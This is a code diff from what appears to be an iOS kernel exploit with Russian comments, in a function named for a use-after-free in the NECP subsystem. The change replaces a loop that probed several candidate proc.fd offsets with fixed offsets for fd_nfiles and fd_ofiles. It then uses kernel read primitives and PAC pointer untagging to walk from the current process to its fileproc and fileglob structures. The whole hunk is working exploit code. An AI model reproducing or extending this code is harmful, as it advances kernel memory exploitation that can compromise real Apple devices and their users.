@@ -4133,26 +4133,18 @@ static long kpNecpUafExecute(int fd, const uint8_t *clientUUID,
             if (!selfProc) selfProc = [self findProcByPid:(uint32_t)getpid() log:r];
             uint64_t fdPtr = 0;
             uint64_t fdTable = 0;
-            // proc.fd оффсет может не совпасть на 18.6: пробуем {0xD0,0xD8,0xE0},
-            // берём тот, что даёт валидную цепь ofiles→fileproc.
-            uint64_t fdOffs[3] = {0xD0, 0xD8, 0xE0};
-            int fdOffOk = -1;
-            for (int oi = 0; oi < 3 && fdOffOk < 0; oi++) {
-                fdPtr = 0;
-                kpRead(selfProc + fdOffs[oi], &fdPtr, 8, "proc.fd?", r);
-                uint64_t cand = kp_untag_ptr(fdPtr);
-                if (!kpLooksLikeKernelPointer(cand)) continue;
-                uint64_t probe = 0;
-                kpRead(cand + 0x28 + (uint64_t)fd * 8, &probe, 8, "ofiles[fd]?", r);
-                if (!kpLooksLikeKernelPointer(kp_untag_ptr(probe))) continue;
-                fdTable = cand;
-                fdOffOk = oi;
-            }
-            kpNote(r, [NSString stringWithFormat:@"  D: proc.fd оффсет: %@ (fdTable=%#llx)",
-                       fdOffOk >= 0 ? [NSString stringWithFormat:@"0x%x РАБОТАЕТ", (unsigned)fdOffs[fdOffOk]] : @"ни один не подошёл", fdTable]);
-            if (fdOffOk < 0) { kpNote(r, @"  D: proc.fd не найден — стоп"); kpNecpRemoveFlow(fd, liveFlow); free(resD); } else {
+            // RE: p_fd — НЕ указатель, а ВСТРОЕННЫЙ filedesc в proc (proc+0xD0).
+            // Цепь: fd_ofiles = *(u64*)(proc+0xF8) (PAC-подпись снимается
+            // kp_untag_ptr), массив [fd*8] = fileproc (сырой).
+            uint32_t fdNfiles = 0;
+            kpRead(selfProc + 0xE4, &fdNfiles, 4, "fd_nfiles", r);
+            kpRead(selfProc + 0xF8, &fdPtr, 8, "fd_ofiles", r);
+            fdTable = kp_untag_ptr(fdPtr);
+            kpNote(r, [NSString stringWithFormat:@"  D: fd_nfiles=%u fd_ofiles=%#llx (untag)", fdNfiles, fdTable]);
+            int fdOffOk = kpLooksLikeKernelPointer(fdTable) ? 1 : -1;
+            if (fdOffOk < 0) { kpNote(r, @"  D: fd_ofiles не указатель — стоп"); kpNecpRemoveFlow(fd, liveFlow); free(resD); } else {
             uint64_t fpRaw = 0;
-            kpRead(fdTable + 0x28 + (uint64_t)fd * 8, &fpRaw, 8, "ofiles[fd]", r);
+            kpRead(fdTable + (uint64_t)fd * 8, &fpRaw, 8, "ofiles[fd]", r);   // fd_ofiles — уже сам массив
             uint64_t fileprocVA = kp_untag_ptr(fpRaw);
             uint64_t globRaw = 0, dataRaw = 0;
             kpRead(fileprocVA + 0x10, &globRaw, 8, "fileproc.glob", r);
